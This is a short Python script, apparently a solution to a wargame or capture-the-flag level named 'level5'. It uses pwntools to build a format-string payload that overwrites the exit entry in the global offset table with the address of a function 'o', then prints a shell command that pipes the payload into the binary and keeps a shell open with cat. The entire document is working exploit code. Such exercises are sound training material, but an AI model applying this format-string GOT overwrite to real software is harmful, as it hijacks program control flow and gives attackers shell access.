from pwn import *

# level5: format string GOT overwrite (exit -> o)

exit_got = 0x08049838
o_addr   = 0x080484a4

addr_le = p32(exit_got)

addr_str = ""
for b in addr_le:
    addr_str += "\\x{:02x}".format(b)

padding = o_addr - 4

cmd = f'( python -c \'print "{addr_str}" + "%{padding}x%4$n"\'; cat ) | ./level5'

print(cmd)
print(addr_le)
print(addr_str)
print(padding)
